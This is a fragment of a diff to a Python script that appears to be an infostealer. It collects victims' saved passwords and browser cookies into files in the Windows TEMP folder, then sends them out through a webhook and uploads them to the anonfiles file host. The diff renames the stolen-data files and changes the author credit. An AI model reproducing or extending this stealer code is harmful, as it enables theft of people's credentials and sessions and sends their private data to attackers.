@@ -15,7 +15,7 @@ import random
 import re
 import subprocess
 
-#  THIS IS 1.1.6 VERSION
+#  Artonus & Ayhu
 #
 # 
 
@@ -358,7 +358,7 @@ def upload(name, link):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
 
-    if name == "cook":
+    if name == "wpcook":
         rb = ' | '.join(da for da in cookiWords)
         if len(rb) > 1000: 
             rrrrr = Reformat(str(cookiWords))
@@ -383,7 +383,7 @@ def upload(name, link):
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
         return
 
-    if name == "passw":
+    if name == "wppassw":
         ra = ' | '.join(da for da in paswWords)
         if len(ra) > 1000: 
             rrr = Reformat(str(paswWords))
@@ -768,7 +768,7 @@ def GatherAll():
     global upths
     upths = []
 
-    for file in ["passw.txt", "cook.txt"]: 
+    for file in ["wppassw.txt", "wpcook.txt"]: 
         # upload(os.getenv("TEMP") + "\\" + file)
         upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))
 
